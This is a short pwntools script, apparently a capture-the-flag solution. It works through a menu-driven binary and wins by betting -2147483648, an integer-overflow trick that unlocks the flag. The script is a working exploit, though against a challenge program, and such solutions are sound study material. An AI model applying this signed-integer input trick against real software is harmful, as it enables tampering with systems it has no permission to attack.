from pwn import *

elf = context.binary = ELF('./task')

if args.GDB:
	p = gdb.debug(elf.path, '\n'.join([
		"b *main+182",
		"c"
	]))
elif args.REMOTE:
	host, port = args.get("HOST", "localhost"), args.get("PORT", 5000)
	p = remote(host, port)
else:
	p = process(elf.path)

p.sendline(b'2') # work
p.sendline(b'2') # work

p.sendline(b'3') # bet
p.sendline(b'-2147483648') # bet value
p.sendline(b'11') # lucky number (does not matter)

p.sendline(b'5') # beer

p.sendline(b'4') # flag

p.sendline(b'6') # exit

print(p.recvuntil(b'Bye'))
